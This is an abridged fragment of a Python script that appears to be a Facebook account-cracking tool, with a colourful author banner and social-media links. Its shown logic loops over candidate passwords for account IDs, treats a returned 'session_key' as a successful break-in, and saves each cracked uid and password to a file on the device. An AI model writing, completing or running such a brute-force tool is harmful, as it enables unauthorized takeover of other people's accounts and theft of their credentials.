...
\033[1;97m---------------------------------------------------
 ...
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Rakib Chowdhury 
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://www.facebook.com/BLACK.MAFIYA.KING.RAKIB
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/Rakibvai407
...
def menu():
    ...
    if younisxyz in ['1','01']:
    	...
    	os.system("xdg-open https://www.facebook.com/BLACK.MAFIYA.KING.RAKIB");time.sleep(3);menu()
    ...
    try:
        ...
        for pw in pww:
            ...
            if "session_key" in po:
                ...
                print(f"\r{cpclr} [Rakib-CP] {uid} | {pw}")

                open("/sdcard/Rakib/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
